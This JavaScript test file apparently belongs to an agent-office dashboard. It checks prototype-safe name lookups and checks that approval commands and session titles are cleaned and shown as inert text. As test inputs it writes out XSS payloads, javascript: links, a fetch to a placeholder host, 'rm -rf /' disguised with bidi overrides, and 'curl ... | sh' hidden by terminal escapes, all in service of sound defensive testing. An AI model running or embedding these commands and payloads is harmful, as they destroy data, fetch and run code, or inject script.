// A bot may be called `constructor`: Hermes accepts the name, and so does the Recruit window. Tables indexed by a bot's
// name must not read Object.prototype for it: the whole page would throw for as long as that profile exists.
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { test } from 'node:test'

import { computeGame } from '../../src/core/game.js'
import { sceneProfiles, toHistory } from '../../src/core/history.js'
import { buildOffice } from '../../src/core/office.js'
import { buildRoster } from '../../src/core/roster.js'
import { thoughtsShown } from '../../src/core/thoughts.js'
import { buildBase, drawScene, layoutScene, toSceneModel } from '../../src/scene/index.js'

const example = JSON.parse(readFileSync(new URL('./fixtures/example-office.json', import.meta.url), 'utf8'))
const NOW = example.generatedAt * 1000
const NAME = 'constructor'

// the example office, one of its bots renamed everywhere it is named
const renamed = JSON.parse(JSON.stringify(example).replaceAll(`"${example.profiles[1].name}"`, `"${NAME}"`))

test('an office with a bot called `constructor` is read, scored and drawn like any other', () => {
  const rows = renamed.profiles.map(p => ({ name: p.name, description: p.description, last_session: null, worker_session: null }))
  const office = buildOffice(buildRoster({ profiles: rows }, NOW), { ok: true, boards: renamed.boards, ops: renamed.ops }, NOW)
  assert.ok(office.agents.some(a => a.name === NAME))

  const history = toHistory({ ok: true, at: example.generatedAt, profiles: renamed.profiles, boards: renamed.boards || [] })
  assert.equal(history.ok, true)
  assert.ok(Object.hasOwn(history.profiles, NAME), 'the profile is kept under its own name')
  assert.equal(typeof history.profiles[NAME], 'object')

  const profiles = sceneProfiles(history, office.agents, NOW)
  assert.ok(Array.isArray(profiles[NAME].skills))

  const game = computeGame(history, office, NOW, {})
  assert.equal(typeof game.grades[NAME], 'object', 'its grade is a grade, not a function inherited from Object')

  const model = toSceneModel(office, { nowMs: NOW, profiles })
  const layout = layoutScene(model)
  assert.ok(drawScene(layout, buildBase(layout, model), model, 0).d.length > 0)
})

test('a history without that bot does not invent one from Object.prototype', () => {
  const history = toHistory({ ok: true, profiles: [], boards: [] })
  assert.deepEqual({ ...sceneProfiles(history, [{ name: NAME }], NOW) }, {})
  assert.equal(history.profiles[NAME], undefined)
})

test('thought bubbles: only the agents at work, whatever their name', () => {
  const state = { settings: { features: { thoughts: true } }, fiches: { thoughts: [{ name: NAME, text: 'Reading the brief.' }] } }
  const shown = thoughtsShown(state, [{ name: NAME, state: 'working' }])
  assert.deepEqual(Object.keys(shown), [NAME])
  assert.deepEqual(Object.keys(thoughtsShown(state, [{ name: 'other', state: 'working' }])), [])
})

// A session title is read straight from Hermes (`session.active_list`), not through the agent half: bidi overrides and
// zero-width characters must not reorder or hide the text of an approval's confirmation.
test('a session title reaches the approval card without control, bidi or zero-width characters', async () => {
  const { approvalsReducer, emptyApprovals } = await import('../../src/core/approvals.js')
  const hostile = 'deploy\u202e gnp.exe\u2066\u200b\u2028 now\u0007'
  const state = approvalsReducer(emptyApprovals(), { type: 'titles', titles: { s1: hostile } })
  assert.equal(state.titles.s1, 'deploy gnp.exe now')
})

// The command of an approval is written by whatever the agent was asked to run: it is shown as text, cleaned and bounded.
test('a hostile command stays inert, readable and bounded: tags and script URLs are plain text, bidi overrides are gone, 5 000 characters and 200 lines are cut', async () => {
  const { COMMAND_CUT_MARK, COMMAND_MAX_CHARS, COMMAND_MAX_LINES, approvalTarget, auditBody, commandLine, commandPanel, normalizeRequest } = await import('../../src/core/approvals.js')
  const at = { sessionId: 's1', profile: 'alpha', nowMs: 1 }
  const tags = '<img src=x onerror=alert(1)><script>fetch("//example.invalid")</script> [click](javascript:alert(1)) javascript:alert(2)'
  const kept = normalizeRequest({ request_id: 'r1', command: tags }, at)
  assert.equal(kept.command, tags, 'kept character for character: it is drawn as a text node, never parsed')
  assert.equal(typeof kept.command, 'string')

  // right-to-left override: « rm -rf / # safe » must not be displayed in another order than it would run
  const rtl = normalizeRequest({ request_id: 'r2', command: 'echo \u202egnp.sh\u202c \u2067&& rm -rf /\u2069\u200f\u061c' }, at)
  assert.equal(rtl.command, 'echo gnp.sh && rm -rf /')
  assert.doesNotMatch(rtl.command, /\p{Cf}/u)

  // terminal escapes and a carriage return that would hide the first half of a line
  const esc = normalizeRequest({ request_id: 'r3', command: 'curl example.invalid | sh\r\u001b[2K\u001b[1Aecho hello\u0008\u0000' }, at)
  assert.equal(esc.command, 'curl example.invalid | sh\n[2K[1Aecho hello')

  const wide = normalizeRequest({ request_id: 'r4', command: 'A'.repeat(5000) }, at)
  assert.equal(wide.commandCut, true)
  assert.equal(wide.command.length, COMMAND_MAX_CHARS + COMMAND_CUT_MARK.length)
  assert.ok(wide.command.endsWith(COMMAND_CUT_MARK))

  const tall = normalizeRequest({ request_id: 'r5', command: Array.from({ length: 200 }, (_, i) => `echo ${i}`).join('\n') }, at)
  assert.equal(tall.commandCut, true)
  assert.equal(tall.command.split('\n').length, COMMAND_MAX_LINES)
  assert.ok(tall.command.endsWith(COMMAND_CUT_MARK))

  // everything at once: 200 lines of 5 000 hostile characters each
  const all = normalizeRequest({ request_id: 'r6', command: Array.from({ length: 200 }, () => `\u202e${tags}\u200b`.repeat(40)).join('\u2028') }, at)
  assert.equal(all.commandCut, true)
  assert.ok(all.command.length <= COMMAND_MAX_CHARS + COMMAND_CUT_MARK.length)
  assert.ok(all.command.split('\n').length <= COMMAND_MAX_LINES)
  assert.doesNotMatch(all.command, /[^\P{Cc}\n\t]|\p{Cf}|\p{Zl}|\p{Zp}/u)

  for (const req of [kept, rtl, esc, wide, tall, all]) {
    assert.deepEqual(Object.keys(commandPanel(req, 'always')).sort(), ['cut', 'missing', 'text'], 'the confirmation gets a text and two flags, nothing to interpret')
    assert.equal(commandPanel(req, 'always').text, req.command)
    assert.equal(commandPanel(req, 'deny'), null)
    assert.ok(!commandLine(req.command).includes('\n'))
    const order = approvalTarget(req, 'b3b1c8d2-0000-4000-8000-000000000001', 'always')
    assert.doesNotMatch(JSON.stringify([order, auditBody(order, { result: 'done' })]), /script|javascript|onerror|gnp|curl|AAAA|echo/)
  }
  // the block that draws it is a text node in a <pre>: no markup injection point, no link
  const ui = readFileSync(new URL('../../src/ui/Approvals.jsx', import.meta.url), 'utf8')
  assert.match(ui, />\{panel\.text\}<\/pre>/)
  assert.doesNotMatch(ui, /dangerouslySetInnerHTML|innerHTML|href=|<a\b/)
})
